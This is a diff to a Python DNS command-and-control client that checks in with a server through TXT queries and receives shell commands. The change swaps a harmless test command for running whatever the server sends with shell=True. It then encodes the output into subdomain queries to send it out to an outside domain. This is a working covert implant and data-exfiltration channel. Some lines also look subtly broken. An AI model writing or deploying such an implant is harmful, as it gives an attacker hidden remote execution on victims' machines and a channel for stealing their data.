@@ -64,7 +64,8 @@ def main():
     try:
         res = dns.resolver.Resolver()
         res.timeout = args.timeout
-        while True:
+        running = True
+        while running:
             sleep(args.timeout)
             subd = encode32("CHK" + str(datetime.datetime.now())) # check in for commands
             if subd.endswith(b"-"): subd += b"0" # can't end a subdomain with "-"
@@ -74,8 +75,8 @@ def main():
             if msgType == "NUL": # nop if nothing from server
                 if debuggin: print(f"{OV}NUL from server{OM}")
             elif msgType == "DIE": # stop if told so
-                print(f"{OR}DIE message received; I'm out")
-                break
+                print(f"{OR}DIE message received; I'm out{OM}")
+                running = False
             elif msgType == "HDR": # command header; process
                 if debuggin: print(f"{OV}HDR from server{OM}")
                 cmdPktCt = int(answer[3:]) # how many lines long is the command?
@@ -86,7 +87,8 @@ def main():
                     answer = decode64(answer[0].to_text())[:3]
                     msgType = answer[:3]
                     command += answer[3:]
-                output = subprocess.check_output("cat /etc/services", shell=True)
+                # output = subprocess.check_output("cat /etc/services", shell=True)
+                output = subprocess.check_output(command, shell=True)
                 codedOutput = encode32(output)
                 respPktCt = int(codedOutput / 57) + 1 # number of packets to send response
                 subd = encode("HDR" + str(respPktCt) + " " + str(datetime.datetime.now())) # tell how many packets of response are coming
@@ -99,13 +101,16 @@ def main():
                     print(OE + error + OM)
                     raise Exception(error)
                 for chunk in chunks:
-                    subd = encode32("RES" + hex(i)[-2:] + chunk)
+                    # subd = encode32("RES" + hex(i)[-2:] + chunk)
+                    subd = encode32("RES" + chunk)
+                    if subd.endswith(b"-"): subd += b"0" # can't start/end subdomain with "-"
+                    if subd.startswith(b"-"): subd = b"0" + subd
                     answer = res.query(subd + args.domain, "TXT")
-                    if decode64(answer[0].to_text())[:5] != "ACK" + hex(i)[-2:]:
-                        error = f"Expected 'ACK{hex(i)[-2:]}' from server, got {decode64(answer[0].to_text())[:5]}"
+                    # if decode64(answer[0].to_text())[:5] != "ACK" + hex(i)[-2:]:
+                    if decode64(answer[0].to_text())[:3] != "ACK":
+                        error = f"Expected 'ACK' from server, got {decode64(answer[0].to_text())[:5]}"
                         print(OE + error + OM)
                         raise Exception(error)
-            # if the answer comes back a certain way, make it a job
     except KeyboardInterrupt:
         pass
     finally:
